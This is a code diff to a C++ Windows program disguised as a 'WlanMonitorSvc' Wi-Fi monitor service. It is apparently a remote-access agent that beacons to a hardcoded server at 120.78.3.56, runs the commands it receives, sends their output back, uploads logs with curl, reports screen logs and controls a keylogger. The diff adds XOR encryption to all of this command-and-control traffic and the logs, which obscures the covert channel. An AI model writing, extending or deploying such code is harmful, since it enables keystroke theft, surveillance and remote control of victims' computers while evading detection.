@@ -38,13 +38,19 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.6.13"
+#define MANUAL_COMPILE_VERSION "1.7.4"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
 const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
+// 在 Debug 构建时，优先连接本地测试服务器 (127.0.0.1:5000)
+#ifdef _DEBUG
+const std::string UPDATE_URL_BASE = "http://127.0.0.1:5000/update/"; // 本地测试服务 (Debug)
+const std::string REPORT_URL_BASE = "http://127.0.0.1:5000/report";   // 本地测试服务 (Debug)
+#else
 const std::string UPDATE_URL_BASE = "http://120.78.3.56:5000/update/"; // 对齐5000端口
-const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report"; // 匹配服务器上的 5000 端口
+const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report";   // 匹配服务器上的 5000 端口
+#endif
 
 // 全局单例互斥锁句柄，放于最顶部方便所有函数调用
 HANDLE g_hMutex = NULL;
@@ -545,6 +551,9 @@ std::string GetExePath() {
 // 先声明，让后面可以调用
 std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
 std::string GetMacAddress();
+std::string UrlEncode(const std::string& str);
+std::string EncryptString(const std::string& data);
+std::string DecryptString(const std::string& hexStr);
 
 // 独立异步线程上传本地日志到云端
 void UploadLogToServer() {
@@ -559,15 +568,16 @@ void UploadLogToServer() {
             if (pos != std::string::npos) {
                 baseUrl = baseUrl.substr(0, pos);
             }
-            std::string targetUrl = baseUrl + "/api/upload_log/" + mac;
+            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(EncryptString(mac));
             std::string curlCmd = "curl.exe -s -m 30 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
             ExecCmd(curlCmd, false);
         }
     }).detach();
 }
 
-// 简单XOR加密并将结果转为Hex编码，防止别人直接通过文本读取
-std::string EncryptLogString(const std::string& data) {
+// 简单XOR加密并将结果转为Hex编码
+std::string EncryptString(const std::string& data) {
+    if (data.empty()) return "";
     std::string key = "PowerOFF2026"; // 你的专属加密密钥
     std::string result = "";
     char hexBuf[5];
@@ -576,6 +586,20 @@ std::string EncryptLogString(const std::string& data) {
         sprintf_s(hexBuf, "%02X", xorChar);
         result += hexBuf;
     }
+    return result;
+}
+
+std::string DecryptString(const std::string& hexStr) {
+    if (hexStr.empty()) return "";
+    std::string key = "PowerOFF2026";
+    std::string result = "";
+    try {
+        for (size_t i = 0; i < hexStr.length(); i += 2) {
+            std::string byteString = hexStr.substr(i, 2);
+            char byte = (char)strtol(byteString.c_str(), NULL, 16);
+            result += (char)(byte ^ key[(i / 2) % key.size()]);
+        }
+    } catch (...) {}
     return result;
 }
 
@@ -599,7 +623,7 @@ void WriteLog(const std::string& message) {
         std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
         // 暂时取消加密，直接输出明文日志
         //logFile << rawLog << std::endl;//无加密
-        logFile << EncryptLogString(rawLog) << std::endl;//有加密
+        logFile << EncryptString(rawLog) << std::endl;//有加密
         logFile.close();
     }
 }
@@ -1021,7 +1045,7 @@ std::string ExecCmd(const std::string& cmd, bool outputIsUtf8) {
 
 // 向服务端提交执行结束的终端输出结果
 void SendOutputToServer(const std::string& mac, const std::string& output) {
-    std::string postData = "mac=" + UrlEncode(mac) + "&output=" + UrlEncode(output);
+    std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&output=" + UrlEncode(EncryptString(output));
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hSession) {
         HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
@@ -1052,7 +1076,7 @@ std::string g_CustomMyName = "";
 void ReportScreenLog(const std::string& log) {
     if (GetMacAddress() == "UNKNOWN_MAC") return;
     std::string utf8Log = AnsiToUtf8(log);
-    std::string postData = "mac=" + UrlEncode(GetMacAddress()) + "&log=" + UrlEncode(utf8Log);
+    std::string postData = "mac=" + UrlEncode(EncryptString(GetMacAddress())) + "&log=" + UrlEncode(EncryptString(utf8Log));
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hSession) {
         HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
@@ -1342,7 +1366,7 @@ void TrimString(std::string &s) {
 // 向服务器报备上线
 void ReportToServer() {
     std::string mac = GetMacAddress();
-    std::string reportUrl = REPORT_URL_BASE + "?mac=" + mac + "&ver=" + CURRENT_VERSION + "&t=" + std::to_string(GetTickCount64());
+    std::string reportUrl = REPORT_URL_BASE + "?mac=" + UrlEncode(EncryptString(mac)) + "&ver=" + UrlEncode(EncryptString(CURRENT_VERSION)) + "&t=" + std::to_string(GetTickCount64());
 
     static ULONGLONG lastFgRead = 0;
     static std::string lastFgStr = "";
@@ -1353,7 +1377,7 @@ void ReportToServer() {
             std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
             TrimString(content);
             if (!content.empty()) {
-                lastFgStr = UrlEncode(AnsiToUtf8(content));
+                lastFgStr = UrlEncode(EncryptString(AnsiToUtf8(content)));
             } else {
                 lastFgStr = "";
             }
@@ -1364,9 +1388,9 @@ void ReportToServer() {
     }
 
     if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES) {
-        reportUrl += "&kl=1";
+        reportUrl += "&kl=" + UrlEncode(EncryptString("1"));
     } else {
-        reportUrl += "&kl=0";
+        reportUrl += "&kl=" + UrlEncode(EncryptString("0"));
     }
 
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -1388,6 +1412,11 @@ void ReportToServer() {
             InternetCloseHandle(hConnect);
 
             TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上
+
+            // 数据解密
+            std::string decResponse = DecryptString(response);
+            if (decResponse.empty() && !response.empty()) decResponse = response;
+            response = decResponse;
 
             // 检测心跳回调是否携带了需要执行的操作命令
             if (!response.empty() && response != "Missing parameters") {
@@ -1610,7 +1639,7 @@ void ReportToServer() {
                         res = "Success: Keylogger offline recording disabled. (Will fully stop on next boot or user logoff)";
                     }
 
-                    std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
+                    std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&type=" + UrlEncode(EncryptString(type)) + "&output=" + UrlEncode(EncryptString(res));
                     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                     if (hSession) {
                         HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
@@ -2298,12 +2327,18 @@ int main()
         return 0; 
     }
 
+    #ifdef _DEBUG
+    WriteLog("========== 程序手动启动 (DEBUG 测试模式，跳过服务与自启安装) ==========");
+    // 直接在当前进程中循环监听，方便断点调试
+    MonitorWiFiLoop();
+#else
     WriteLog("========== 程序手动启动 (管理员进入安装模式) ==========");
 
     // 作为普通管理程序运行时，目标是安装为后台服务并启动
     InstallAndStartService();
 
     WriteLog("========== 安装动作完毕，原实例退出，交由 Windows SCM 后台管理 ==========\n");
+#endif
     return 0;
 }
 
